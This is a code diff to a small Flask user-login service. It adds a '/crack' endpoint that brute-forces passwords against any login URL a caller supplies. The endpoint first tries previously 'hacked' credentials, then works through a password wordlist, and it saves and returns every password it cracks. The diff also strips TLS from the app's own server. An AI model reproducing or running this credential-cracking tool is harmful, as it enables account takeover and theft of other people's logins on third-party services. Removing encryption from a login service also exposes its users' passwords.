@@ -1,9 +1,12 @@
 from flask import Flask, request, jsonify, g
 import sqlite3
+import time
 
+import requests
 app = Flask(__name__)
 
 DATABASE = 'users.db'
+
 
 # SQLite database initialization
 def get_db():
@@ -18,6 +21,7 @@ def close_db(exception):
     db = getattr(g, '_database', None)
     if db is not None:
         db.close()
+
 
 # Login API
 @app.route('/login', methods=['GET'])
@@ -65,5 +69,49 @@ def signup():
         db.commit()
         return jsonify({'message': 'User created successfully.'}), 201
 
+def create_req(username,password,url):
+    newUrl = url + '?username=' + username + '&password=' + password
+    headers = {
+        "Content-Type": "application/json"
+    }
+    response = requests.get(newUrl, headers=headers)
+    return response
+
+@app.route('/crack', methods=['POST'])
+def crack():
+
+        username = request.json.get('username')
+        url = request.json.get('url')
+
+        lines = open("text.txt",'r+').readlines()
+        psw_list = [line.strip() for line in lines]
+        start_time = time.time()
+
+        f_r = open("hackedUser.txt", "r+")
+        ext_users = [line.split(",") for line in f_r.readlines()]
+        for i in ext_users:
+            if(username in i):
+                res = create_req(username,i[1],url)
+                if res.status_code == 200:
+                    password = i[1]
+                    f_r.close()
+                    break
+        else:
+            for i in psw_list:
+                res = create_req(username, i, url)
+                if res.status_code == 200:
+                    f_a = open("hackedUser.txt","a+")
+                    f_a.write(f"{username},{i},{url}")
+                    f_a.close()
+                    password = i
+                    break
+
+        end_time = time.time()
+
+        return '{"username": "' + username + '", "password": "' + password + '" , "url" : "' + url + '", "time": "' + str(
+            (end_time - start_time) // 1) + ' S"}'
+
+
 if __name__ == '__main__':
-    app.run(ssl_context='adhoc')
+    app.run()
+
